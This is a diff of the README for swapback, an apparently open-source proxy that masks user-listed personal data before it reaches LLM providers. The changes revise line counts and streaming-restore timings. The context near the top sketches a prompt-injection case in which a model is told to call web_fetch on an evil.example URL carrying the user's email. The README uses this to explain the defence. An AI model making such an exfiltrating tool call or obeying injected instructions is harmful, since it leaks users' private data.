@@ -19,7 +19,7 @@
 talks OpenAI Chat Completions, OpenAI Responses or Anthropic Messages (set its base URL, change nothing else). You write
 down the names, emails, phones, IDs and addresses that must never reach a model provider. The provider only sees
 `«PERSON_1»`; your app gets the original text back, byte-exact, in plain and streamed replies. There is no model to
-download and nothing probabilistic: exact matching plus patterns, about 5,700 lines of Python, 3 dependencies.
+download and nothing probabilistic: exact matching plus patterns, about 5,800 lines of Python, 3 dependencies.
 
 **Tool calls can't carry your listed values out.** An agent reads a page or an email with a prompt injection in it,
 and the model is told to call `web_fetch("https://evil.example/?q=<your email>")`. The model only ever had
@@ -581,7 +581,7 @@ Other open-source projects do the same job. This table reflects each project's o
 | | **swapback** | [PasteGuard][pg] | [Maskit][mk] | [Veil][vl] | [piighost][ph] | [Kiji Privacy Proxy][kj] |
 |---|---|---|---|---|---|---|
 | License | MIT | Apache-2.0 | AGPL-3.0 | Apache-2.0 | MIT | Apache-2.0 |
-| Stack | Python 3.11+, about 5,700 lines (292 KB), 3 deps, stdlib HTTP server | TypeScript on Bun + GLiNER detector service; Docker | Python engine + desktop app; Docker | Python 3.11+ (PyPI, Homebrew), about 630 KB of Python; httpx, cryptography, pyahocorasick | Python library (PyPI); HTTP proxy in a separate repo, piighost-api | Go server + Electron desktop app; Docker, systemd |
+| Stack | Python 3.11+, about 5,800 lines (296 KB), 3 deps, stdlib HTTP server | TypeScript on Bun + GLiNER detector service; Docker | Python engine + desktop app; Docker | Python 3.11+ (PyPI, Homebrew), about 630 KB of Python; httpx, cryptography, pyahocorasick | Python library (PyPI); HTTP proxy in a separate repo, piighost-api | Go server + Electron desktop app; Docker, systemd |
 | Needs an ML model | No | Yes: GLiNER for names and places ([docs][pg-sem]) | Ships a local ONNX NER model | Optional: 46 MB ONNX NER | Optional: pluggable regex, NER or LLM detectors; exact-match needs none | Yes: local ONNX model, 26 PII types |
 | Your own list of values | Yes: a YAML/JSON file you write (or build from a vCard/CSV export), typed, reloaded live | Yes: `denylist` patterns ([docs][pg-mask]) | Yes: custom words and regexes | Yes: seeded from your databases, fixtures, git history and schemas | Yes: `ExactMatchDetector` | Custom regex rules |
 | Stand-ins | Typed placeholders (`«EMAIL_1»`) | Placeholders | Unclear | Pseudonyms | Typed placeholders (`<<EMAIL:1>>`) | Realistic dummy values |
@@ -670,13 +670,14 @@ Listing a value in `known.yaml` or `private_terms.yaml` covers any of these. The
   through with placeholders left in. When a held-back piece is sent as an extra Responses delta, later
   `sequence_number`s are shifted so they stay unique and increasing. Non-streaming JSON replies of any shape are restored. Plain-text streams hold back at
   most one partial placeholder (up to 24 characters), so chunks can arrive slightly regrouped. A streamed reply whose
-  text is itself escaped JSON is held back longer (measured: about 200 characters at 2 levels, up to about 15,000 at
-  8) and arrives in bursts. The text is unchanged either way.
+  text is itself escaped JSON is held back longer (measured: up to about 20 characters at 2 levels, up to about 300 at
+  8, about one escaped placeholder) and arrives in bursts. The text is unchanged either way.
 - **Long streamed replies that are themselves escaped JSON are restored slowly.** The time grows roughly with the
-  square of the reply's length. Measured on a shared 4-core test box: 10 KB in 3 s and 40 KB in 42 s at 2 JSON
-  levels, 10 KB in 6.5 s at 4 levels and 19 s at 8. `scrub_timeout_s` does not cover the restore, so such a reply is
+  square of the reply's length. Measured on a shared 4-core test box with two different test models (the time
+  depends on how the model splits its stream): 10 KB in 1–3 s and 40 KB in 7–42 s at 2 JSON levels, 10 KB in
+  0.3–18 s at 8 levels. `scrub_timeout_s` does not cover the restore, so such a reply is
   slow, not cut off. Not affected: non-streamed replies (160 KB at 2 levels in 0.3 s), plain-text streams (160 KB in
-  4 s, most of it the test model's own pacing) and streamed tool-call arguments. It needs a reply of several thousand
+  about 4 s) and streamed tool-call arguments. It needs a reply of several thousand
   tokens that is escaped JSON, which is rare in chat.
 - **A name split by a comma and a line break, across quoted CSV columns, or by a bar with no blank beside it, is blocked,
   not swapped.** `Faith,\nRidge`
